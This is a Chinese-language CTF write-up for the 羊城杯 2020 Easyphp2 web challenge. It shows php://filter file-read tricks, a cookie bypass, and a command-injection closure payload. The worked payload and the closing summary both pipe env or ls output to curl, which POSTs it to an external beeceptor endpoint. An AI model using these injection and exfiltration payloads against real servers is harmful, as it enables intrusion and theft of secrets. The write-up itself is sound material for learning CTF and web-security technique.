# \[羊城杯 2020]Easyphp2

## \[羊城杯 2020]Easyphp2

## 考点

* `php://filter`伪协议使用`convert.quoted-printable-encode`读取文件
* `php://filter`伪协议使用`convert.iconv.utf-8.utf-16be`或者`utf-16`读取文件
* 命令执行闭合

## wp

http://de728f9e-3e26-4948-9d38-37eba5bbd65e.node4.buuoj.cn:81/?file=GWHT.php 试试文件包含

`php://filter/read=convert.quoted-printable-encode/resource=GWHT.php`

&#x20;得到一部分代码

```php
<?php
    ini_set('max_execution_time', 5);

    if ($_COOKIE['pass'] !== getenv('PASS')) {
        setcookie('pass', 'PASS');
        die('wrong');

    if (isset($_GET["count"])) {
        $count = $_GET["count"];
        if(preg_match('/;|base64|rot13|base32|base16|<\?php|#/i', $count)){
        	die('hacker!');
        }
        echo "shell".exec('printf \'' . $count . '\' | wc -c');
```

没办法绕过第一个if，继续找信息，访问`robots.txt`提示`/?file=check.php`

读取check.php

```php
<?php
$pass = "GWHT";
// Cookie password.
echo "Here is nothing, isn't it ?";
header('Location: /');
```

得到`PASS`是`GWHT`，修改cookie，接下来是命令执行

执行的语句是`printf 'payload' | wc -c`，闭合语句就行了payload是`'&&id||'`

到[https://beeceptor.com](https://beeceptor.com/)开个链接接收数据

payload

`http://de728f9e-3e26-4948-9d38-37eba5bbd65e.node4.buuoj.cn:81/GWHT.php?file=GWHT.php&count=`<mark style="color:orange;">`'%26%26echo%20env%20>%20/tmp/1.txt%26%26curl -v -X POST 'https://peri0d.free.beeceptor.com/my/api/' -d @/tmp/1.txt||'`</mark>

本题读取文件还可以用如下方式

```
两次URL编码
?file=php://filter/convert.%25%36%32ase64-encode/resource=GWHT.php
utf-16编码
?file=php://filter/read=convert.iconv.utf-8.utf-16be/resource=GWHT.php
```

## 小结

1. curl可用时可以使用如下方式命令执行，我称之为curl命令执行外带

```
echo `ls /` > 1.txt;curl -v -X POST 'https://peri0d.free.beeceptor.com/my/api/' -d @1.txt
```
